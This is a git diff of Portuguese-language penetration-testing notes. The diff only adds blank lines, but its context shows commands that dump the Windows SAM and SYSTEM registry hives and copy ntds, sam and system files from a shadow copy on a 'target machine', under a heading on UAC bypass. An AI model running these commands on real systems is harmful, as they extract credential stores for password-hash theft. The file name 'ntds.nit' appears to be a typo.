@@ -35,6 +35,7 @@ A desvantagem de utilizar os arquivos da pasta *repair* é que pode ocorrer do a
 Para baixar os arquivos **sam** e **system** através do registro do Windows, utilize os *comandos abaixo direto no terminal da máquina alvo:
 
 ``reg save hklm\sam samOK``
+
 ``reg save hklm\system systemOK``
 
 Esse método consegue retornar o arquivo sam com todos os usuários atuais do sistema.
@@ -53,7 +54,9 @@ Montar uma cópia do volume alvo
 
 Copiar os arquivos da cópia para o disco local
 ``copy \\?\VOLUME_COPIA\windows\ntds\ntds.nit C:\ntds.nit``
+
 ``copy \\?\VOLUME_COPIA\windows\system32\config\sam C:\sam``
+
 ``copy \\?\VOLUME_COPIA\windows\system32\config\system C:\system``
 
 ## Bypass UAC (Executar como Administrador)
